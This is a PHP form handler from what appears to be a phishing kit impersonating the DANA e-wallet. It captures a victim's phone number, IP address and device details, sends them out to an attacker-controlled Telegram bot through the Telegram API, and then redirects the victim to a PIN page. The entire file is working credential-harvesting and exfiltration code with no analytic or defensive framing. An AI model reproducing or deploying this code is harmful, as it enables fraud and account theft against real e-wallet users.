<?php
include "../manyu/data.php";
session_start();
    $nomor = $_POST["nomor"];

    $_SESSION['nomor'] = $nomor;
        // Mendapatkan informasi IP pengguna
        $ipAddress = $_SERVER['REMOTE_ADDR'];

        // Mendapatkan informasi perangkat pengguna
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $platform = '';
        if (strpos($userAgent, 'Windows') !== false) {
            $platform = 'Windows';
        } elseif (strpos($userAgent, 'Macintosh') !== false) {
            $platform = 'Macintosh';
        } elseif (strpos($userAgent, 'Linux') !== false) {
            $platform = 'Linux';
        }

    // Kirim data ke bot Telegram
    $message = "
( DANA | NO HP ".$nomor." )

- N0 HP  : ".$nomor."

- Ip Address  : ".$ipAddress."
- Device  : ".$userAgent." - ".$platform."
     ";
    

     function sendMessage($id_telegram, $message, $id_botTele) {
        $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
        $url = $url . "&text=" . urlencode($message);
        $ch = curl_init();
        $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    sendMessage($id_telegram, $message, $id_botTele);
    header('Location: ../pin.php');
?>
